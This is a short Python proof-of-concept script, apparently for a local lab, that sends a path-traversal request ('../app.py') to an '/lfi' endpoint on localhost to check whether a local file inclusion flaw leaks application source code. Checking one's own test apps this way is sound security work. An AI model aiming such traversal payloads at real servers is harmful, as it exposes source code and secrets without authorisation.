import requests

def run_lfi_attack():
    # Attempt to read sensitive file via LFI vulnerability
    target_url = "http://127.0.0.1:5000/lfi?file=../app.py"
    response = requests.get(target_url)
    if "def run_lfi_attack" in response.text:
        print("LFI vulnerability confirmed: source code exposed")
    else:
        print("LFI test failed or vulnerability patched")

if __name__ == "__main__":
    run_lfi_attack()
